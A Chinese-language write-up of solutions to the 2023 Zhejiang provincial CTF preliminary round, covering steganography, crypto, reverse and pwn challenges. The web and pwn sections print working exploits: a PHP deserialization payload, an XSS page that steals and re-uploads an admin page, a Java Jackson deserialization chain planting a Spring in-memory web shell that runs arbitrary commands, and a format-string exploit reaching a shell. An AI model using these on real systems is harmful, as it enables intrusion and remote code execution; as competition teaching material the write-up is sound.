# 2023 浙江省赛初赛

# Misc

## number gamenumber game

打开 F12 查看前端源码，发现这有一段代码挺可疑的，这里直接拿到控制台跑一下就行

```typescript
var _0x14184c = [0x38, 0x6f, 0x1e, 0x24, 0x1, 0x32, 0x51, 0x45, 0x1, 0x3c, 0x24, 0xb, 0x55, 0x38, 0xa, 0x5d, 0x28, 0x12, 0x33, 0xb, 0x5d, 0x20, 0x1e, 0x46, 0x17, 0x3d, 0x10, 0x2a, 0x41, 0x44, 0x49, 0x1a, 0x31, 0x5a]
          , _0x477866 = '';
        for (var _0x6698b7 = 0x0; _0x6698b7 < _0x14184c['length']; _0x6698b7++)
            _0x477866 += String[_0x38f496(0xd9)](_0x14184c[_0x6698b7] ^ _0x6698b7 + 0x5a);
        alert(_0x477866);
```

## Steins_Gate

图片像素由嘟噜组成，并且每个字所占像素大小相同，并且颜色渐变，猜测 lsb 隐写要从字中提取像素

每个字是 16*16，尝试提取中心点等尝试不对；考虑到字都有一个口字旁，且其所占像素位置一致，尝试提取

![](static/FsJybAUlJo12yrx9gt3cdLEqnVh.png)

发现 lsb 隐写有个 base64 编码，是一个多行的 base64，且每一行都有两个等号，两个等号后有一些杂数据，去除

```python
from PIL import Image
import libnum
img = Image.open('Steins_Gate.png')
f=open('rgb.txt','wb')
width,height=img.size
for i in range(6,height,16):
    try:
        bins = ""
        for j in range(2,width,16):
            tmp = img.getpixel((j,i))
            bins += str(tmp[0] & 1) + str(tmp[1] & 1) + str(tmp[2] & 1)
        data = libnum.b2s(bins)
        print(data.index(b"=="))
        f.write(data[:data.index(b"==")+2]+b"\n")
    except:
        break
```

然后 base64 解密得到一个 jpg，同时多行 base64，明显 base64 隐写

```python
import base64
bin_str=''
b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('rgb.txt','r') as f:
    for line in f.readlines():
        stegb64="".join(line.split())
        rowb64="".join(str(base64.b64encode(base64.b64decode(stegb64)),'utf-8').split())
        offset=abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=', '')[-1]))
        equalnum=line.count('=')
        if equalnum:
            bin_str += bin(offset)[2:].zfill(equalnum * 2)
    #print(bin_str)
    print(''.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0,len(bin_str),8)]))
```

得到 DuDuLu~T0_Ch3@t_THe_w0r1d，猜测 jpg 隐写，逐格尝试，发现是 outguess

![](static/VKj5b5XRMouiSMxTgr6c07hTnId.png)

## Ez_misc

看 yuanshen 文件明显是一个字节颠倒的 jpg

![](static/Or94bs9RjobN07xuZQccsNL7nId.png)

steghide 隐写

![](static/JtY5bYeTaorTe1xtD74cjZJHn9R.png)

![](static/FgCQbiEbLoFHmTxZ2dOcCTX2nfe.png)

# Web

## Easy php

反序列化

```php
<?php

class AAA{
    public $cmd;
}
class BBB{
    public $param1;
}
class CCC{
    public $func;
}

$b = new BBB();
$a = new AAA();
$c = new CCC();
$b->param1 = $c;
$c->func = $a;
$a->cmd = "system('cat /flag');";

echo urlencode(serialize($b));
```

## my2to

Xssbot

题目的 flag 在 admin 的页面，所以得想办法 XSS 来获取 admin 的页面；审计代码发现存在文件上传接口

![](static/N5uEbYpC8oXSf5x74gBczQ3enIh.png)

![](static/O28Wb8Q9ao10bLx0DGWclhrHnGd.png)

所以可以上传一个恶意的 html 文件进行 XSS，但由于题目环境不出网，所以得想办法外带 flag；这里还是可以利用题目给的文件上传接口来讲 flag 写入 `public/uploads`

```html
<script>
    if(document.domain != "localhost") {
      location = "http://localhost/uploads/attack.html";
    }else{
      fetch("/todo", {method: "GET", credentials: "include"})
      .then(res => res.text())
      .then(data => {
        var blob = new Blob([data], { type: 'text/plain' });
        var formData = new FormData();
        formData.append('file', blob, 'result.txt');
        fetch('/api/upload', {
          method: 'POST',
          body: formData,
        });});
}
</script>
```

上传后，触发 bot 访问

## Can you read flag

开局一个注释 `//eval($_GET[a]);` 直接 `/?a=system('whoami');` 发现有 waf

使用 `file_get_contents` 尝试读 index.php 得到

![](static/Z4o8b4zmXoP7Ggxut0ccQfR0nve.png)

ban 了一些东西，直接再套一层 `eval` 轻松绕过

![](static/AQqKbPiMfooxwyxASYBcSe2rnhg.png)

但直接读 flag 没有权限，运行 `/readflag` 又需要交互式的 shell 去计算给的值。

但查看/tmp/src 目录下的源码，可以发现题目 `/readflag` 的源码，其随机数生成有缺陷，种子是 time(0)，因此可以写一个 c 语言程序，得到 10 秒之后的结果，输出到文件里，再将文件重定向给/readflag，即可通过计算题检查

```c
int main(){
        unsigned int v3 = time(0)+10;
        unsigned int v9;
        unsigned int v10;
        srand(v3);
        int v11 = rand() % 101 + 100;
        printf("y\n");
        for (int i = 0; i < v11; ++i){
                v10 = rand() % 1000000;
                v9 = rand() % 9000000;
                printf("%d\n", v10+v9);
        }
}
```

![](static/L0aVb9a3kojH4wxcC31c65qUnxh.png)

![](static/DK2FbYIMzoklfwxEBmRcLXSGnx5.png)

## secObj

题目给了 jar 包，审计发现存在反序列化接口

![](static/SWyYbgjWVoKodkxUVphcsSdjnhg.png)

但过滤了一些类，然后这里其实可以使用 jackson 链 + 二次反序列化 +HotSwappableTargetSource 来绕过

```java
package com.example.demo.exp;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

public class Exp {

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        //内存马
        byte[] bytes = Repository.lookupClass(MemShell.class).getBytes();

        Templates templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "aaaa");
        setFieldValue(templatesImpl, "_tfactory", null);
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject((Serializable) proxyObj, privateKey, signingEngine);

        POJONode jsonNodes = new POJONode(signedObject);
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(jsonNodes);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("1"));
        HashMap hashMap = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(res);

    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
}
```

内存马

```java
package com.example.demo.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

//springboot 2.6 + 内存马
public class MemShell extends AbstractTranslet {

    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = MemShell.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            MemShell springControllerMemShell = new MemShell();
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);

        } catch (Exception hi) {
//            hi.printStackTrace();
        }
    }

    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

然后就是绕过 spring security 了，注意这里只用了一个 `*` ，所以存在绕过；最后加上 `_csrf` token 即可

![](static/GripbOIkhoNLl3xQS7OcPnjAnbf.png)

![](static/WnrbbHhvfoZYAWxlCkZczzqcnZc.png)

# Crypto

## 小小数学家

```python
f = open("flag.txt",'r')
while True:
    tmp = f.readline()
    if tmp == '':
        break
    else:
        print(chr(int(eval(tmp[:tmp.index('=')]))),end='')
```

## <strong>An EaSy Cipher</strong>

aes cbc zerepadding 6 位密码爆破

```java
import base64
from Crypto.Cipher import AES
import libnum


def zeropadding(password):
    password = password + b"\x00"*(16 - len(password) % 16)
    return password


def pkcs7padding(password):
    l = 16 - (len(password) % 16)
    password = password + (chr(l).encode())*(16 - len(password) % 16)
    return password


line = open("superdic.txt","rb").readlines()
for i in line:
    password = zeropadding(i[:-2])
    text = base64.b64decode("Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08")
    aes = AES.new(password,AES.MODE_ECB)
    den_text = aes.decrypt(text)
    if(b"flag" in den_text or b"DASCTF" in den_text):
        print(den_text)
        print(password)
```

## Yusa 的密码学课堂——基础数论

sage 库里有专门可以调用的函数，two_squares，所以直接秒杀

```python
s = 173178061442550241596295506150572803829268102881297542445649200353047297914764783385643705889370567071577408829104128703765633248277722687055281420899564198724968491216409225857070531370724352556864154450614891750313803499101686782558259953244119778256806332589612663957000269869144555485216828399422391672121
a,b = two_squares(s)
from hashlib import md5
print(md5(str(a+b).encode()).hexdigest())
```

当然，在数论含义上，我们可以在复域上分解数字，把它的常数和 i 的系数分别作为分解的结果，也可以解出这个题目。看 maple 的博客看到过。

## EC_Party-III

低解密指数，连分数直接打

```python
ct = [10517482889776460226798449006280081167663671198448544453304563030553066300585088657159799516828057458092448853052920, 10402402380108575947733278581108880071660185906203575453837669489513650182676772750843558327746184945922314875098996, 452239510514900186933709062848646640558105660312444312121851933676754687850508865659206624803226663304812888272594694285123823218948165607478144589871322148031514596122654196640778853480169180864412134209693877604844174450602155353, 137939931394124279393027766586199451754893501053862574760060288577053514723631473985259186063729745515767167268309839903521149677958518517988564142828176577685619561913731155508981456507557881596602396073589127827579264760182112015, (312312975924665463422872243489714243976133330669934414246404507993066820310886215600585539115436654843078716170526368558972800117033427241194242498913898005160762151892979826292737941332916578310350510245475526522735894588645243659, 422891099305786578397746684898210811095359530216631541482542541898542508551347882962281401572399110483550691802487377837504493122807091311281569558317360479103461652558448871769150783477147866528115922507893061101403528629595165327)]

a,b,n,e,(Cx,Cy) = ct
E = EllipticCurve(Zmod(n),[a,b])
C = E(Cx,Cy)
O = E(0,1,0)

c = continued_fraction((e/n))

for i in range(200):
    d,k = (c.denominator(i),c.numerator(i))
    print(d)
    if C*(e*d-1) == O and d != 1:
        print(d)
        break
```

d = 861078593737268627868079

```python
ct = [10517482889776460226798449006280081167663671198448544453304563030553066300585088657159799516828057458092448853052920, 10402402380108575947733278581108880071660185906203575453837669489513650182676772750843558327746184945922314875098996, 452239510514900186933709062848646640558105660312444312121851933676754687850508865659206624803226663304812888272594694285123823218948165607478144589871322148031514596122654196640778853480169180864412134209693877604844174450602155353, 137939931394124279393027766586199451754893501053862574760060288577053514723631473985259186063729745515767167268309839903521149677958518517988564142828176577685619561913731155508981456507557881596602396073589127827579264760182112015, (312312975924665463422872243489714243976133330669934414246404507993066820310886215600585539115436654843078716170526368558972800117033427241194242498913898005160762151892979826292737941332916578310350510245475526522735894588645243659, 422891099305786578397746684898210811095359530216631541482542541898542508551347882962281401572399110483550691802487377837504493122807091311281569558317360479103461652558448871769150783477147866528115922507893061101403528629595165327)]

a,b,n,e,(Cx,Cy) = ct
E = EllipticCurve(Zmod(n),[a,b])
C = E(Cx,Cy)
O = E(0,1,0)

d = 861078593737268627868079
m = C*d
m = m[0]
import libnum
print(libnum.n2s(int(m)))
```

# Reverse

## Pyccc

uncom 反编译得到字节码

![](static/BsAfbEBfuotyVUxnLmFcfrnEnQ8.png)

一眼异或

```python
a = [102,109,99,100,127,52,114,88,97,122,85,125,105,127,119,80,120,112,98,39,109,52,55,106]

for i in range(len(a)):
    print(chr(a[i] ^ i),end="")
```

## easyapk

打开发现是一个叫做 des 的 aes，有 iv 和密码，密码把 e 替换成 3

![](static/OmAZbNI2XoPMGwxZES3c8diYnWH.png)

![](static/D1NTbTJH5ott00xbfwxcBNYQnXd.png)

# Pwn

## <strong>BrokenPrint</strong>

栈上有 libc 地址，利用栈溢出泄露得到 libc 基址。但是格式化字符串漏洞 ban 掉了 x 和 p，所以其他地址泄露不了，为了方便调试可以先 patch 一下，去掉对 p 的过滤

利用格式化字符串，修改栈上指向 rbp 的值的末一位字节来修改返回地址，需要爆破 1/16，同时因为开了 PIE，vuln 地址也不知道，所以还需要爆破 1/16 的概率,才能控制程序流重新回到 vuln

同时利用格式化字符串漏洞，劫持掉 puts 里的一个函数为 one_gadget，第二次返回时输入 ppp 触发 puts 来 getshell

```python
#encoding: utf-8
#!/usr/bin/python

from pwn import *
import sys
#from LibcSearcher import LibcSearcher

context.log_level = 'debug'
context.arch='amd64'

local=0
binary_name='pwn'
libc_name='libc-2.31.so'

libc=ELF("./"+libc_name)
elf=ELF("./"+binary_name)

def exp():
    if local:
        p=process("./"+binary_name)
        #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name})
        #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name])
        #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])
    else:
        p=remote('1.14.108.193',32685)

    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass

    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()

    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,b'\x00'))

    # variables

    # gadgets

    og = [0xe6aee,0xe6af1,0xe6af4]

    # helper functions

    op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32
    op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64

    # main

    sa("Login:",'A'*(0x18-1)+':')
    ru(':')
    libc_base = leak_address()-2016704
    __strlen_avx2 = libc_base + 2011304
    one_gadget = libc_base + og[1]
    success("libc_base:"+hex(libc_base))
    success("__strlen_avx2:"+hex(__strlen_avx2))
    
    payload  = '%20768c%22$hn'
    payload += '%{}c%13$hn'.format((one_gadget&0xffff) - 20768)
    payload += '%{}c%14$hn'.format(((one_gadget>>16)&0xffff) - one_gadget&0xffff)
    payload  = payload.ljust(0x28,'\x00')+p64(__strlen_avx2)+p64(__strlen_avx2+2)
    payload  = payload.ljust(0x70,'\x00')+'\xb8'
    
    #z("b *$rebase(0x135E)")
    #pause()
    
    sa("Content:",payload)

    sa("Login:",'yemei')
    sa("Content:",'ppp')

    ia()

#exp()

while True:
    try:
        exp()
    except:
        continue
```
